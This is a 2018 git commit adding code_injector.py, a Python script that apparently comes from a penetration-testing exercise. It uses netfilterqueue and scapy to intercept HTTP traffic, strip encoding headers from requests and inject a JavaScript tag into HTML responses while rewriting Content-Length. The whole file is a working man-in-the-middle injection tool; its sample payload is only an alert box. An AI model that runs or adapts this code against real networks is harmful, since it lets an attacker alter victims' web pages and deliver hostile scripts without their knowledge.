a8a9076351e4d8611db2573d65f0e381f57d4596
Darshil Desai <32188374+dexter-morgan@users.noreply.github.com>
2018-12-11 01:49:27 +0530

    Create code_injector.py

---
+++ code_injector.py
@@ -0,0 +1,42 @@
+#!usr/bin/env python
+
+import netfilterqueue
+import scapy.all as scapy
+import re
+
+def set_load(scapy_packet, load):
+    scapy_packet[scapy.Raw].load = load
+    del scapy_packet[scapy.IP].len
+    del scapy_packet[scapy.IP].chksum
+    del scapy_packet[scapy.TCP].chksum
+    return scapy_packet
+
+
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw) and "script" not in scapy_packet[scapy.Raw].load:
+        load = scapy_packet[scapy.Raw].load
+        if scapy_packet[scapy.TCP].dport == 80:
+            print("[+] Request")
+            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+	    load = load.replace("HTTP/1.1", "HTTP/1.0")
+
+        elif scapy_packet[scapy.TCP].sport == 80:
+            print("[+] Response")
+            injection_code = '<script>alert("Code Injected");</script>'
+            load = load.replace("<html>","<html>" + injection_code )
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+            if content_length_search and "text/html" in load:
+                content_length = content_length_search.group(1)
+                new_content_length = int(content_length) + len(injection_code)
+                load = load.replace(content_length, str(new_content_length))
+
+        if load != scapy_packet[scapy.Raw].load:
+            new_packet = set_load(scapy_packet, load)
+            packet.set_payload(str(new_packet))
+    packet.accept()
+
+
+queue = netfilterqueue.NetfilterQueue()
+queue.bind(0, process_packet)
+queue.run()
